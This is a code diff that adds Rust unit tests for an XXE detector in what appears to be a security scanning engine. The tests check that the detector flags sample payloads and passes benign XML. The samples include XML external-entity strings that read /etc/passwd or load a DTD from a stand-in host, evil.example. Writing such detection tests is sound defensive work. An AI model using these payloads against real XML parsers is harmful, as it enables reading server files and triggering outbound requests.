@@ -11,7 +11,6 @@
 ///   - Edge cases: empty input, very long input, case insensitivity
 ///
 /// Run with: `cargo test` from `rust/1sec-engine/`
-
 #[cfg(test)]
 mod comprehensive_tests {
     use crate::events::{MatchResult, Severity};
@@ -35,6 +34,61 @@ mod comprehensive_tests {
 
     fn matcher_min_score(min: f64) -> PatternMatcher {
         PatternMatcher::new(&all_patterns(), min, true)
+    }
+
+    #[test]
+    fn test_xxe_external_dtd() {
+        for m in [matcher(), matcher_no_ac()] {
+            for input in [
+                r#"<!ENTITY xxe SYSTEM "file:///etc/passwd">"#,
+                r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.example">]>"#,
+                r#"<!DOCTYPE foo PUBLIC "-//EXAMPLE//DTD TEST//EN" "https://evil.example/a.dtd"><foo/>"#,
+                r#"<!DOCTYPE foo SYSTEM "relative.dtd"><foo/>"#,
+                "<!DOCTYPE\nfoo\nSYSTEM\n'relative.dtd'><foo/>",
+                r#"<!doctype foo public "identifier" "relative.dtd"><foo/>"#,
+            ] {
+                let result = m.scan("xxe", &[("body", input)]);
+                assert!(
+                    result
+                        .matches
+                        .iter()
+                        .any(|p| p.pattern_name == "deser_xml_entity"),
+                    "missed {input}"
+                );
+            }
+            for input in [
+                "<foo>ordinary XML</foo>",
+                "<!DOCTYPE foo><foo/>",
+                "<!DOCTYPE html>",
+            ] {
+                let result = m.scan("xml", &[("body", input)]);
+                assert!(
+                    !result
+                        .matches
+                        .iter()
+                        .any(|p| p.pattern_name == "deser_xml_entity"),
+                    "flagged {input}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn test_xxe_unicode_name_preview() {
+        let input = format!(
+            "<!DOCTYPE {} SYSTEM \"relative.dtd\"><foo/>",
+            "一".repeat(100)
+        );
+        for m in [matcher(), matcher_no_ac()] {
+            let result = m.scan("xxe-unicode", &[("body", &input)]);
+            let found = result
+                .matches
+                .iter()
+                .find(|p| p.pattern_name == "deser_xml_entity")
+                .unwrap();
+            assert!(found.matched_text.len() <= 203);
+            assert!(input.starts_with(found.matched_text.strip_suffix("...").unwrap()));
+        }
     }
 
     // ────────────────────────────────────────────────────────────────────────
